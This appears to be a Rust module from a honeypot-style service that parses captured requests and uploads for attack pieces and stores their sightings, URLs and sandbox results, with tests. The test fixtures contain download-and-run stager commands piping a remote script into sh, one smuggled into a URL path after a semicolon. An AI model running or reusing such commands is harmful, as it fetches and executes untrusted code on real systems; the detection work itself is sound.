//! The pieces the X-ray ([`crate::model::xray`]) finds in stored requests
//! and uploads, kept as this node's sightings: which piece, in which row,
//! from which address, in which role. Derived on each node from rows it
//! holds, never replicated, never exported, as the canaries are
//! ([`super::canaries`]). Decoded text is never stored, only the pieces
//! (at most [`MAX_VALUE`] bytes each) and, for a stager, the URL it came
//! from (at most [`MAX_URLS`] per piece), which only the sandbox view shows
//! raw. Nothing here fetches or resolves anything.
//!
//! Extraction runs in the background ([`backfill`]), never on the write
//! path: the trap's rows start with `xray_v = 0` and are read in batches,
//! the parsing outside any transaction and on a blocking thread. A row's
//! deletion (any path: admin, address, retention, a cluster tombstone)
//! removes its sightings through the triggers of migration 0052; URLs only
//! that row named, and counts, follow in [`refresh_counts`].
use super::Store;
use crate::model::xray::{
    Grade, MAX_URLS, MAX_VALUE, Piece, PieceKind, Policy, Role, Source, XRAY_V, parse,
};
use anyhow::Result;
use sqlx::{SqliteConnection, SqlitePool};
use std::time::Duration;

/// Rows read per batch, and so per write transaction.
const BATCH: i64 = 200;
/// Pause between two batches: the trap's and replication's writes get the
/// lock, and the parser leaves the CPU to them.
const PAUSE: Duration = Duration::from_millis(250);
/// Rows stamped per statement without being read.
const STAMP_CHUNK: i64 = 5000;
/// An upload this small is not worth a `file` piece.
const MIN_FILE: i64 = 32;
/// `settings` key: the X-ray version the stored sightings were derived with.
const VERSION_KEY: &str = "pieces_xray_v";

/// What a piece is stored as. `file` comes from the store, the rest from
/// the parser.
fn kind_str(k: PieceKind) -> &'static str {
    match k {
        PieceKind::Exploit => "exploit",
        PieceKind::Recipe => "recipe",
        PieceKind::Tag => "tag",
        PieceKind::ShellProfile => "shell-profile",
        PieceKind::Stager => "stager",
        PieceKind::Key => "key",
    }
}

fn role_str(r: Role) -> &'static str {
    match r {
        Role::Exploit => "exploit",
        Role::Tag => "tag",
        Role::Recipe => "recipe",
        Role::Stager => "stager",
        Role::SelfHosted => "self-hosted",
        Role::Queried => "queried",
        Role::Key => "key",
        Role::File => "file",
        Role::Opaque => "opaque",
    }
}

fn grade_str(g: Grade) -> &'static str {
    match g {
        Grade::Seen => "seen",
        Grade::Claimed => "claimed",
        Grade::External => "external",
    }
}

/// A piece's key: the hash of its kind and value.
pub fn piece_hash(kind: &str, value: &str) -> i64 {
    crate::canary::hash(&format!("{kind}\0{value}"))
}

/// `s` cut to at most `max` bytes, on a character boundary.
fn cut(s: &str, max: usize) -> String {
    let mut end = s.len().min(max);
    while !s.is_char_boundary(end) {
        end -= 1;
    }
    s[..end].to_string()
}

/// One piece as it is written.
#[derive(Debug, Clone, PartialEq, Eq)]
struct Found {
    kind: &'static str,
    role: &'static str,
    grade: &'static str,
    value: String,
    url: Option<String>,
}

impl Found {
    fn of(p: &Piece) -> Found {
        Found {
            kind: kind_str(p.kind),
            role: role_str(p.role),
            grade: grade_str(p.grade),
            value: cut(&p.value, MAX_VALUE),
            url: p.url.as_deref().map(|u| cut(u, MAX_VALUE)),
        }
    }

    /// The `file` piece of an upload: its content's SHA-256.
    fn file(sha256: &[u8]) -> Found {
        Found {
            kind: "file",
            role: "file",
            grade: "seen",
            value: data_encoding::HEXLOWER.encode(sha256),
            url: None,
        }
    }
}

/// Rows with something to read: a body, a query, or a path that holds a
/// command separator, `$`, a backtick or a blank, or is percent-encoded
/// (the parser decodes it, so `%3B` is a `;`). The other rows only get
/// their `xray_v` stamped.
const HEAVY: &str = "(body IS NOT NULL AND length(body) > 0)
     OR (query IS NOT NULL AND query <> '')
     OR instr(path, ';') > 0 OR instr(path, '|') > 0 OR instr(path, '&') > 0
     OR instr(path, '$') > 0 OR instr(path, char(96)) > 0
     OR instr(path, ' ') > 0 OR instr(path, char(9)) > 0
     OR instr(path, '%') > 0 OR instr(path, '+') > 0";

#[derive(sqlx::FromRow)]
struct ReqRow {
    id: i64,
    ts: String,
    ip_id: i64,
    ip: String,
    method: String,
    path: String,
    query: Option<String>,
    body: Option<Vec<u8>>,
}

fn extract_request(r: &ReqRow) -> Vec<Found> {
    let x = parse(
        Source::Request {
            method: &r.method,
            path: &r.path,
            query: r.query.as_deref(),
            body: r.body.as_deref(),
            sender: Some(&r.ip),
        },
        Policy::embedded(),
    );
    x.pieces.iter().map(Found::of).collect()
}

#[derive(sqlx::FromRow)]
struct UpRow {
    id: i64,
    uid: String,
    ts: String,
    ip_id: i64,
    ip: String,
    size: i64,
    sha256: Vec<u8>,
}

#[derive(Clone, Copy)]
enum Table {
    Requests,
    Uploads,
}

/// Mark `table`'s row `id` as read by version `v`, if it still exists and
/// is still unread. `false`: deleted since it was read (a tombstone), or
/// read by someone else meanwhile; write nothing for it.
async fn stamp(conn: &mut SqliteConnection, table: Table, id: i64, v: i64) -> Result<bool> {
    let sql = match table {
        Table::Requests => "UPDATE requests SET xray_v = ? WHERE id = ? AND xray_v = 0",
        Table::Uploads => "UPDATE uploads SET xray_v = ? WHERE id = ? AND xray_v = 0",
    };
    Ok(sqlx::query(sql)
        .bind(v)
        .bind(id)
        .execute(&mut *conn)
        .await?
        .rows_affected()
        == 1)
}

/// Store a source's pieces. `ts` is the row's time.
async fn write(
    conn: &mut SqliteConnection,
    source_kind: &str,
    source_id: i64,
    ip_id: i64,
    ts: &str,
    found: &[Found],
) -> Result<()> {
    for f in found {
        let hash = piece_hash(f.kind, &f.value);
        // Counts are 0 until `refresh_counts`.
        sqlx::query(
            "INSERT INTO pieces (hash, kind, value, first_seen, last_seen, ips, sources)
             VALUES (?1, ?2, ?3, ?4, ?4, 0, 0)
             ON CONFLICT (hash) DO UPDATE SET
               first_seen = MIN(first_seen, excluded.first_seen),
               last_seen = MAX(last_seen, excluded.last_seen)",
        )
        .bind(hash)
        .bind(f.kind)
        .bind(&f.value)
        .bind(ts)
        .execute(&mut *conn)
        .await?;
        sqlx::query(
            "INSERT OR IGNORE INTO piece_sightings
               (piece, source_kind, source_id, ip_id, role, grade, ts)
             VALUES (?, ?, ?, ?, ?, ?, ?)",
        )
        .bind(hash)
        .bind(source_kind)
        .bind(source_id)
        .bind(ip_id)
        .bind(f.role)
        .bind(f.grade)
        .bind(ts)
        .execute(&mut *conn)
        .await?;
        if let Some(url) = &f.url {
            sqlx::query(
                "INSERT OR IGNORE INTO piece_url_sources
                   (piece, url, source_kind, source_id, ts)
                 VALUES (?, ?, ?, ?, ?)",
            )
            .bind(hash)
            .bind(url)
            .bind(source_kind)
            .bind(source_id)
            .bind(ts)
            .execute(&mut *conn)
            .await?;
            sqlx::query(
                "INSERT INTO piece_urls (piece, url, first_seen, last_seen, sources)
                 VALUES (?1, ?2, ?3, ?3, 1)
                 ON CONFLICT (piece, url) DO UPDATE SET
                   first_seen = MIN(first_seen, excluded.first_seen),
                   last_seen = MAX(last_seen, excluded.last_seen),
                   sources = (SELECT COUNT(*) FROM piece_url_sources
                              WHERE piece = ?1 AND url = ?2)",
            )
            .bind(hash)
            .bind(url)
            .bind(ts)
            .execute(&mut *conn)
            .await?;
            trim_urls(conn, hash).await?;
        }
    }
    Ok(())
}

/// Keep a piece's newest [`MAX_URLS`] URLs.
async fn trim_urls(conn: &mut SqliteConnection, piece: i64) -> Result<()> {
    let dropped = sqlx::query(
        "DELETE FROM piece_urls WHERE piece = ?1 AND url NOT IN
           (SELECT url FROM piece_urls WHERE piece = ?1
            ORDER BY last_seen DESC, url LIMIT ?2)",
    )
    .bind(piece)
    .bind(MAX_URLS as i64)
    .execute(&mut *conn)
    .await?
    .rows_affected();
    if dropped > 0 {
        sqlx::query(
            "DELETE FROM piece_url_sources WHERE piece = ?1 AND url NOT IN
               (SELECT url FROM piece_urls WHERE piece = ?1)",
        )
        .bind(piece)
        .execute(&mut *conn)
        .await?;
    }
    Ok(())
}

/// Read the rows extraction has left, with the current X-ray version.
/// Returns how many rows were parsed (rows without anything to read are
/// stamped and not counted).
pub async fn backfill(pool: &SqlitePool) -> Result<u64> {
    backfill_at(pool, XRAY_V).await
}

async fn backfill_at(pool: &SqlitePool, v: i64) -> Result<u64> {
    reset_if_changed(pool, v).await?;
    stamp_light(pool, v).await?;
    Ok(walk_requests(pool, v).await? + walk_uploads(pool, v).await?)
}

/// A new X-ray version reads every row again: clear what the old one
/// derived and mark every row unread. Pieces stay (an operator's results
/// hang on them) until [`refresh_counts`] finds them without sightings,
/// and keep their old counts until then.
async fn reset_if_changed(pool: &SqlitePool, v: i64) -> Result<()> {
    let stored: Option<String> = sqlx::query_scalar("SELECT value FROM settings WHERE key = ?")
        .bind(VERSION_KEY)
        .fetch_optional(pool)
        .await?;
    let now = v.to_string();
    if stored.as_deref() == Some(&now) {
        return Ok(());
    }
    if stored.is_some() {
        let mut tx = pool.begin_with("BEGIN IMMEDIATE").await?;
        for sql in [
            "DELETE FROM piece_sightings",
            "DELETE FROM piece_url_sources",
            "DELETE FROM piece_urls",
        ] {
            sqlx::query(sql).execute(&mut *tx).await?;
        }
        tx.commit().await?;
        for (max_sql, sql) in [
            (
                "SELECT MAX(id) FROM requests",
                "UPDATE requests SET xray_v = 0 WHERE id > ?1 AND id <= ?2 AND xray_v <> 0",
            ),
            (
                "SELECT MAX(id) FROM uploads",
                "UPDATE uploads SET xray_v = 0 WHERE id > ?1 AND id <= ?2 AND xray_v <> 0",
            ),
        ] {
            let max: Option<i64> = sqlx::query_scalar(max_sql).fetch_one(pool).await?;
            let mut lo = 0;
            while lo < max.unwrap_or(0) {
                sqlx::query(sql)
                    .bind(lo)
                    .bind(lo + STAMP_CHUNK)
                    .execute(pool)
                    .await?;
                lo += STAMP_CHUNK;
                tokio::time::sleep(PAUSE / 10).await;
            }
        }
    }
    sqlx::query(
        "INSERT INTO settings (key, value) VALUES (?, ?)
         ON CONFLICT (key) DO UPDATE SET value = excluded.value",
    )
    .bind(VERSION_KEY)
    .bind(now)
    .execute(pool)
    .await?;
    Ok(())
}

/// Stamp the requests with nothing to read, without reading them. Walks
/// id ranges, so each row is looked at once.
async fn stamp_light(pool: &SqlitePool, v: i64) -> Result<()> {
    let sql = format!(
        "UPDATE requests SET xray_v = ?1
         WHERE id > ?2 AND id <= ?3 AND xray_v = 0 AND NOT ({HEAVY})"
    );
    let max: Option<i64> = sqlx::query_scalar("SELECT MAX(id) FROM requests")
        .fetch_one(pool)
        .await?;
    let mut lo = 0;
    while lo < max.unwrap_or(0) {
        sqlx::query(sqlx::AssertSqlSafe(sql.as_str()))
            .bind(v)
            .bind(lo)
            .bind(lo + STAMP_CHUNK)
            .execute(pool)
            .await?;
        lo += STAMP_CHUNK;
        tokio::time::sleep(PAUSE / 10).await;
    }
    Ok(())
}

async fn walk_requests(pool: &SqlitePool, v: i64) -> Result<u64> {
    let (mut done, mut after) = (0u64, 0i64);
    loop {
        let rows: Vec<ReqRow> = sqlx::query_as(
            "SELECT r.id, r.ts, r.ip_id, i.ip, r.method, r.path, r.query, r.body
             FROM requests r JOIN ips i ON i.id = r.ip_id
             WHERE r.xray_v = 0 AND r.id > ? ORDER BY r.id LIMIT ?",
        )
        .bind(after)
        .bind(BATCH)
        .fetch_all(pool)
        .await?;
        let Some(last) = rows.last() else {
            return Ok(done);
        };
        after = last.id;
        // Parsed outside any transaction, off the async threads.
        let (rows, found) = tokio::task::spawn_blocking(move || {
            let found: Vec<Vec<Found>> = rows.iter().map(extract_request).collect();
            (rows, found)
        })
        .await?;
        write_requests(pool, &rows, &found, v).await?;
        done += rows.len() as u64;
        tokio::time::sleep(PAUSE).await;
    }
}

/// Store a batch read earlier, in one short transaction. A row deleted
/// since it was read is not stamped, so nothing is stored for it.
async fn write_requests(
    pool: &SqlitePool,
    rows: &[ReqRow],
    found: &[Vec<Found>],
    v: i64,
) -> Result<()> {
    let mut tx = pool.begin_with("BEGIN IMMEDIATE").await?;
    for (r, f) in rows.iter().zip(found) {
        if stamp(&mut tx, Table::Requests, r.id, v).await? {
            write(&mut tx, "request", r.id, r.ip_id, &r.ts, f).await?;
        }
    }
    tx.commit().await?;
    Ok(())
}

async fn walk_uploads(pool: &SqlitePool, v: i64) -> Result<u64> {
    let (mut done, mut after) = (0u64, 0i64);
    loop {
        let rows: Vec<UpRow> = sqlx::query_as(
            "SELECT u.id, u.uid, u.ts, u.ip_id, i.ip, u.size, u.sha256
             FROM uploads u JOIN ips i ON i.id = u.ip_id
             WHERE u.xray_v = 0 AND u.id > ? ORDER BY u.id LIMIT ?",
        )
        .bind(after)
        .bind(BATCH)
        .fetch_all(pool)
        .await?;
        let Some(last) = rows.last() else {
            return Ok(done);
        };
        after = last.id;
        // One text at a time: a batch never holds more than one upload.
        let mut found: Vec<Vec<Found>> = Vec::with_capacity(rows.len());
        for r in &rows {
            found.push(extract_upload(pool, r).await?);
        }
        let mut tx = pool.begin_with("BEGIN IMMEDIATE").await?;
        for (r, f) in rows.iter().zip(&found) {
            if stamp(&mut tx, Table::Uploads, r.id, v).await? {
                write(&mut tx, "upload", r.id, r.ip_id, &r.ts, f).await?;
            }
        }
        tx.commit().await?;
        done += rows.len() as u64;
        tokio::time::sleep(PAUSE).await;
    }
}

/// A text upload goes through the parser; any upload of at least
/// [`MIN_FILE`] bytes is a `file` piece. Binaries are never parsed.
async fn extract_upload(pool: &SqlitePool, r: &UpRow) -> Result<Vec<Found>> {
    let mut out = vec![];
    let mut conn = pool.acquire().await?;
    if let Some(u) = super::uploads::get(&mut conn, &r.uid).await?
        && let Some(text) = super::uploads::text_for_xray(&mut conn, &u).await?
    {
        drop(conn);
        let (name, ip) = (u.filename, r.ip.clone());
        out = tokio::task::spawn_blocking(move || {
            let x = parse(
                Source::Upload {
                    name: name.as_deref(),
                    text: &text,
                    sender: Some(&ip),
                },
                Policy::embedded(),
            );
            x.pieces.iter().map(Found::of).collect::<Vec<_>>()
        })
        .await?;
    }
    if r.size >= MIN_FILE {
        out.push(Found::file(&r.sha256));
    }
    Ok(out)
}

/// The refresh statements for the pieces whose key is in `?1..=?2`.
fn refresh_sql() -> [String; 5] {
    [
        // A URL only a deleted source named.
        "DELETE FROM piece_url_sources WHERE piece >= ?1 AND piece <= ?2 AND NOT EXISTS
           (SELECT 1 FROM piece_sightings g WHERE g.piece = piece_url_sources.piece
            AND g.source_kind = piece_url_sources.source_kind
            AND g.source_id = piece_url_sources.source_id)"
            .into(),
        "DELETE FROM piece_urls WHERE piece >= ?1 AND piece <= ?2 AND NOT EXISTS
           (SELECT 1 FROM piece_url_sources s
            WHERE s.piece = piece_urls.piece AND s.url = piece_urls.url)"
            .into(),
        "UPDATE piece_urls SET
           sources = a.n, first_seen = a.f, last_seen = a.l
         FROM (SELECT piece, url, COUNT(*) n, MIN(ts) f, MAX(ts) l
               FROM piece_url_sources WHERE piece >= ?1 AND piece <= ?2
               GROUP BY piece, url) a
         WHERE piece_urls.piece = a.piece AND piece_urls.url = a.url
           AND (piece_urls.sources <> a.n OR piece_urls.first_seen <> a.f
                OR piece_urls.last_seen <> a.l)"
            .into(),
        "UPDATE pieces SET ips = a.ips, sources = a.sources,
           first_seen = a.f, last_seen = a.l
         FROM (SELECT piece, COUNT(DISTINCT ip_id) ips,
                      COUNT(DISTINCT source_kind || ':' || source_id) sources,
                      MIN(ts) f, MAX(ts) l
               FROM piece_sightings WHERE piece >= ?1 AND piece <= ?2
               GROUP BY piece) a
         WHERE pieces.hash = a.piece
           AND (pieces.ips <> a.ips OR pieces.sources <> a.sources
                OR pieces.first_seen <> a.f OR pieces.last_seen <> a.l)"
            .into(),
        "DELETE FROM pieces WHERE hash >= ?1 AND hash <= ?2
           AND NOT EXISTS
             (SELECT 1 FROM piece_sightings g WHERE g.piece = pieces.hash)
           AND NOT EXISTS (SELECT 1 FROM piece_results r WHERE r.piece = pieces.hash)"
            .into(),
    ]
}

async fn refresh_range(conn: &mut SqliteConnection, lo: i64, hi: i64) -> Result<()> {
    for sql in refresh_sql() {
        sqlx::query(sqlx::AssertSqlSafe(sql.as_str()))
            .bind(lo)
            .bind(hi)
            .execute(&mut *conn)
            .await?;
    }
    Ok(())
}

/// Recompute what the sightings imply: each piece's addresses, sources
/// and first and last time; each URL's sources and times. Delete pieces
/// and URLs nothing sights any more (the delete triggers already removed
/// most; this catches the rest), except pieces an operator entered
/// results for. One pass over everything: the background runs
/// [`extract`], which does it in short transactions.
pub async fn refresh_counts(conn: &mut SqliteConnection) -> Result<()> {
    refresh_range(conn, i64::MIN, i64::MAX).await
}

/// Buckets of the piece-hash space [`extract`] refreshes one transaction
/// at a time.
const REFRESH_BUCKETS: i128 = 256;
/// `settings` key: the sighting count at the last refresh.
const REFRESHED_KEY: &str = "pieces_refreshed_n";
/// One extraction at a time: a version reset must not overlap another.
static EXTRACTING: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());

/// [`backfill`], then [`refresh_counts`] in short transactions, one per
/// bucket of piece keys, unless nothing was read and the sighting count is
/// what the last refresh saw. The background callers use this.
pub async fn extract(pool: &SqlitePool) -> Result<u64> {
    let _one = EXTRACTING.lock().await;
    let n = backfill(pool).await?;
    let count: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM piece_sightings")
        .fetch_one(pool)
        .await?;
    let last: Option<String> = sqlx::query_scalar("SELECT value FROM settings WHERE key = ?")
        .bind(REFRESHED_KEY)
        .fetch_optional(pool)
        .await?;
    if n == 0 && last.as_deref() == Some(count.to_string().as_str()) {
        return Ok(0);
    }
    let width = (1i128 << 64) / REFRESH_BUCKETS;
    for b in 0..REFRESH_BUCKETS {
        let lo = i64::MIN as i128 + b * width;
        let hi = lo + width - 1;
        let mut tx = pool.begin_with("BEGIN IMMEDIATE").await?;
        refresh_range(&mut tx, lo as i64, hi as i64).await?;
        tx.commit().await?;
        tokio::time::sleep(PAUSE / 25).await;
    }
    sqlx::query(
        "INSERT INTO settings (key, value) VALUES (?, ?)
         ON CONFLICT (key) DO UPDATE SET value = excluded.value",
    )
    .bind(REFRESHED_KEY)
    .bind(count.to_string())
    .execute(pool)
    .await?;
    Ok(n)
}

/// A piece found in a source.
#[derive(Debug, Clone, PartialEq, Eq, sqlx::FromRow)]
pub struct SourcePiece {
    pub hash: i64,
    pub kind: String,
    pub value: String,
    pub role: String,
    pub grade: String,
}

/// A stored piece with its counts.
#[derive(Debug, Clone, PartialEq, Eq, sqlx::FromRow)]
pub struct PieceRow {
    pub hash: i64,
    pub kind: String,
    pub value: String,
    pub first_seen: String,
    pub last_seen: String,
    pub ips: i64,
    pub sources: i64,
}

/// A URL a stager's value came from: raw attacker text, shown defanged.
#[derive(Debug, Clone, PartialEq, Eq, sqlx::FromRow)]
pub struct PieceUrl {
    pub url: String,
    pub first_seen: String,
    pub last_seen: String,
    pub sources: i64,
}

impl Store {
    /// The pieces found in a request (`"request"`) or upload (`"upload"`),
    /// by id.
    pub async fn pieces_of_source(&self, kind: &str, id: i64) -> Result<Vec<SourcePiece>> {
        Ok(sqlx::query_as(
            "SELECT p.hash, p.kind, p.value, g.role, g.grade
             FROM piece_sightings g JOIN pieces p ON p.hash = g.piece
             WHERE g.source_kind = ? AND g.source_id = ?
             ORDER BY p.kind, p.value, g.role",
        )
        .bind(kind)
        .bind(id)
        .fetch_all(&self.read)
        .await?)
    }

    pub async fn piece(&self, hash: i64) -> Result<Option<PieceRow>> {
        Ok(sqlx::query_as(
            "SELECT hash, kind, value, first_seen, last_seen, ips, sources
             FROM pieces WHERE hash = ?",
        )
        .bind(hash)
        .fetch_optional(&self.read)
        .await?)
    }

    /// The URLs of a piece, newest first (at most [`MAX_URLS`]).
    pub async fn piece_urls(&self, hash: i64) -> Result<Vec<PieceUrl>> {
        Ok(sqlx::query_as(
            "SELECT url, first_seen, last_seen, sources FROM piece_urls
             WHERE piece = ? ORDER BY last_seen DESC, url LIMIT ?",
        )
        .bind(hash)
        .bind(MAX_URLS as i64)
        .fetch_all(&self.read)
        .await?)
    }
}

/// Results one piece may hold.
pub const MAX_RESULTS: i64 = 32;
const FAMILY_MAX: usize = 64;
const TEXT_MAX: usize = 2000;

/// What an admin entered from an external sandbox. Every field is
/// optional, but not all of them at once.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct NewResult {
    pub sha256: Option<String>,
    pub family: Option<String>,
    pub source_url: Option<String>,
    pub note: Option<String>,
}

impl NewResult {
    /// Trimmed, empty fields dropped, the hash in lower case; or why it
    /// cannot be kept. The URL is text for a person to copy: it is never
    /// parsed, fetched or resolved.
    pub fn checked(&self) -> Result<NewResult, String> {
        fn field(v: &Option<String>, max: usize, name: &str) -> Result<Option<String>, String> {
            let v = v.as_deref().map(str::trim).filter(|v| !v.is_empty());
            match v {
                Some(v) if v.chars().count() > max => {
                    Err(format!("{name} is over {max} characters"))
                }
                Some(v) if v.chars().any(char::is_control) && name != "note" => {
                    Err(format!("{name} holds a control character"))
                }
                v => Ok(v.map(str::to_string)),
            }
        }
        let sha256 = self
            .sha256
            .as_deref()
            .map(str::trim)
            .filter(|v| !v.is_empty())
            .map(str::to_ascii_lowercase);
        if let Some(h) = &sha256
            && !(h.len() == 64
                && h.bytes()
                    .all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b)))
        {
            return Err("the SHA-256 is 64 hexadecimal characters".into());
        }
        let r = NewResult {
            sha256,
            family: field(&self.family, FAMILY_MAX, "family")?,
            source_url: field(&self.source_url, TEXT_MAX, "sandbox URL")?,
            note: field(&self.note, TEXT_MAX, "note")?,
        };
        if r == NewResult::default() {
            return Err("enter at least one of SHA-256, family, URL or note".into());
        }
        Ok(r)
    }
}

/// A stored result.
#[derive(Debug, Clone, PartialEq, Eq, sqlx::FromRow)]
pub struct PieceResult {
    pub piece: i64,
    pub id: i64,
    pub sha256: Option<String>,
    pub family: Option<String>,
    pub source_url: Option<String>,
    pub note: Option<String>,
    pub added_by: String,
    pub added_at: String,
}

impl Store {
    /// Record a sandbox result on a stager or file that joins a chain (or
    /// already has results). Node-local: nothing reaches the replicated
    /// log. Returns the result's id.
    pub async fn add_piece_result(&self, piece: i64, r: &NewResult, by: &str) -> Result<i64> {
        let r = r.checked().map_err(anyhow::Error::msg)?;
        let mut tx = self.pool.begin().await?;
        let ok: bool = sqlx::query_scalar(
            "SELECT EXISTS (SELECT 1 FROM pieces WHERE hash = ?1 AND kind IN ('stager', 'file')
                            AND (EXISTS (SELECT 1 FROM chain_pieces WHERE piece = ?1)
                                 OR EXISTS (SELECT 1 FROM piece_results WHERE piece = ?1)))",
        )
        .bind(piece)
        .fetch_one(&mut *tx)
        .await?;
        if !ok {
            anyhow::bail!("results go on a stager or file that joins a chain");
        }
        let (n, next): (i64, i64) = sqlx::query_as(
            "SELECT COUNT(*), COALESCE(MAX(id), 0) + 1 FROM piece_results WHERE piece = ?",
        )
        .bind(piece)
        .fetch_one(&mut *tx)
        .await?;
        if n >= MAX_RESULTS {
            anyhow::bail!("this piece holds {MAX_RESULTS} results already");
        }
        sqlx::query(
            "INSERT INTO piece_results
               (piece, id, sha256, family, source_url, note, added_by, added_at)
             VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))",
        )
        .bind(piece)
        .bind(next)
        .bind(&r.sha256)
        .bind(&r.family)
        .bind(&r.source_url)
        .bind(&r.note)
        .bind(cut(by, 200))
        .execute(&mut *tx)
        .await?;
        tx.commit().await?;
        Ok(next)
    }

    /// A piece's results, oldest first.
    pub async fn piece_results(&self, piece: i64) -> Result<Vec<PieceResult>> {
        Ok(sqlx::query_as(
            "SELECT piece, id, sha256, family, source_url, note, added_by, added_at
             FROM piece_results WHERE piece = ? ORDER BY id LIMIT ?",
        )
        .bind(piece)
        .bind(MAX_RESULTS)
        .fetch_all(&self.read)
        .await?)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::store::requests::NewRequest;

    const IP: &str = "203.0.113.5";
    const STAGER: &[u8] = b"curl -s http://example.org:8080/x.sh | sh";

    async fn store() -> (Store, tempfile::TempDir) {
        let dir = tempfile::tempdir().unwrap();
        let s = Store::connect(&dir.path().join("t.db")).await.unwrap();
        (s, dir)
    }

    async fn request(s: &Store, ip: &str, body: Option<&[u8]>, ts: &str) -> (i64, i64) {
        let ip_id = s.upsert_ip(ip.parse().unwrap()).await.unwrap().id;
        let id = s
            .insert_request(&NewRequest {
                ip_id,
                method: "POST".into(),
                path: "/x".into(),
                headers_json: "[]".into(),
                labels_json: "[]".into(),
                body: body.map(<[u8]>::to_vec),
                ts: Some(ts.into()),
                ..Default::default()
            })
            .await
            .unwrap();
        (id, ip_id)
    }

    async fn count(s: &Store, from: &str) -> i64 {
        sqlx::query_scalar(sqlx::AssertSqlSafe(format!("SELECT COUNT(*) FROM {from}")))
            .fetch_one(&s.pool)
            .await
            .unwrap()
    }

    async fn xray_v(s: &Store, id: i64) -> i64 {
        sqlx::query_scalar("SELECT xray_v FROM requests WHERE id = ?")
            .bind(id)
            .fetch_one(&s.pool)
            .await
            .unwrap()
    }

    async fn refresh(s: &Store) {
        let mut c = s.pool.acquire().await.unwrap();
        refresh_counts(&mut c).await.unwrap();
    }

    async fn run(s: &Store) {
        extract(&s.pool).await.unwrap();
    }

    #[tokio::test]
    async fn extraction_writes_sightings_and_urls() {
        let (s, _d) = store().await;
        let (id, ip_id) = request(&s, IP, Some(STAGER), "2026-10-01 00:00:00").await;
        run(&s).await;
        let pieces = s.pieces_of_source("request", id).await.unwrap();
        let stager = pieces
            .iter()
            .find(|p| p.kind == "stager")
            .expect("a stager piece");
        assert_eq!(
            (stager.value.as_str(), stager.role.as_str()),
            ("example.org", "stager")
        );
        assert_eq!(stager.hash, piece_hash("stager", "example.org"));
        let row = s.piece(stager.hash).await.unwrap().unwrap();
        assert_eq!((row.ips, row.sources), (1, 1));
        assert_eq!(row.first_seen, "2026-10-01 00:00:00");
        let urls = s.piece_urls(stager.hash).await.unwrap();
        assert_eq!(urls.len(), 1);
        assert_eq!(urls[0].url, "http://example.org:8080/x.sh");
        let ip: i64 = sqlx::query_scalar("SELECT ip_id FROM piece_sightings WHERE piece = ?")
            .bind(stager.hash)
            .fetch_one(&s.pool)
            .await
            .unwrap();
        assert_eq!(ip, ip_id);
        assert_eq!(xray_v(&s, id).await, XRAY_V);
    }

    #[tokio::test]
    async fn backfill_is_batched_and_idempotent() {
        let (s, _d) = store().await;
        let n = BATCH as usize + 20;
        for i in 0..n {
            let ip = format!("192.0.2.{}", 1 + i % 200);
            request(&s, &ip, Some(STAGER), "2026-10-01 00:00:00").await;
        }
        assert_eq!(backfill(&s.pool).await.unwrap(), n as u64);
        refresh(&s).await;
        let sightings = count(&s, "piece_sightings").await;
        let h = piece_hash("stager", "example.org");
        let row = s.piece(h).await.unwrap().unwrap();
        assert_eq!((row.ips, row.sources), (200, n as i64));
        // Nothing left; a second pass reads and changes nothing.
        assert_eq!(backfill(&s.pool).await.unwrap(), 0);
        refresh(&s).await;
        assert_eq!(count(&s, "piece_sightings").await, sightings);
        assert_eq!(s.piece(h).await.unwrap().unwrap(), row);
        assert_eq!(s.piece_urls(h).await.unwrap()[0].sources, n as i64);
    }

    #[tokio::test]
    async fn new_xray_version_rederives() {
        let (s, _d) = store().await;
        let (id, _) = request(&s, IP, Some(STAGER), "2026-10-01 00:00:00").await;
        run(&s).await;
        let before = s.pieces_of_source("request", id).await.unwrap();
        assert!(!before.is_empty());
        // Stand in for what an older version derived.
        sqlx::query("DELETE FROM piece_sightings")
            .execute(&s.pool)
            .await
            .unwrap();
        sqlx::query(
            "INSERT INTO piece_sightings VALUES (1, 'request', ?, 1, 'stager', 'seen', 'x')",
        )
        .bind(id)
        .execute(&s.pool)
        .await
        .unwrap();
        assert_eq!(backfill_at(&s.pool, XRAY_V + 1).await.unwrap(), 1);
        assert_eq!(s.pieces_of_source("request", id).await.unwrap(), before);
        assert_eq!(xray_v(&s, id).await, XRAY_V + 1);
        // The made-up sighting went with the old derivation.
        assert_eq!(count(&s, "piece_sightings WHERE piece = 1").await, 0);
    }

    #[tokio::test]
    async fn light_rows_are_skipped() {
        let (s, _d) = store().await;
        let (light, _) = request(&s, IP, None, "2026-10-01 00:00:00").await;
        let (empty, _) = request(&s, IP, Some(b""), "2026-10-01 00:00:00").await;
        let (heavy, _) = request(&s, IP, Some(STAGER), "2026-10-01 00:00:00").await;
        assert_eq!(backfill(&s.pool).await.unwrap(), 1, "only the body is read");
        for id in [light, empty, heavy] {
            assert_eq!(xray_v(&s, id).await, XRAY_V, "every row is stamped");
        }
        assert!(
            s.pieces_of_source("request", light)
                .await
                .unwrap()
                .is_empty()
        );
        assert!(
            !s.pieces_of_source("request", heavy)
                .await
                .unwrap()
                .is_empty()
        );
    }

    #[tokio::test]
    async fn heavy_path_is_read() {
        let (s, _d) = store().await;
        let ip_id = s.upsert_ip(IP.parse().unwrap()).await.unwrap().id;
        s.insert_request(&NewRequest {
            ip_id,
            method: "GET".into(),
            path: "/x;curl http://example.org/a.sh|sh".into(),
            headers_json: "[]".into(),
            labels_json: "[]".into(),
            ..Default::default()
        })
        .await
        .unwrap();
        assert_eq!(backfill(&s.pool).await.unwrap(), 1);
    }

    #[tokio::test]
    async fn upload_file_piece_needs_32_bytes() {
        let (s, _d) = store().await;
        let big = vec![b'a'; 32];
        let small = vec![b'b'; 31];
        crate::store::uploads::seed_upload(&s, "203.0.113.6", "/a.php", &big).await;
        crate::store::uploads::seed_upload(&s, "203.0.113.7", "/b.php", &small).await;
        run(&s).await;
        let files: Vec<(String, String, String)> = sqlx::query_as(
            "SELECT p.value, g.role, g.grade FROM piece_sightings g
             JOIN pieces p ON p.hash = g.piece WHERE p.kind = 'file' AND g.source_kind = 'upload'",
        )
        .fetch_all(&s.pool)
        .await
        .unwrap();
        use sha2::Digest;
        let want = data_encoding::HEXLOWER.encode(&sha2::Sha256::digest(&big));
        assert_eq!(files, vec![(want, "file".into(), "seen".into())]);
    }

    #[tokio::test]
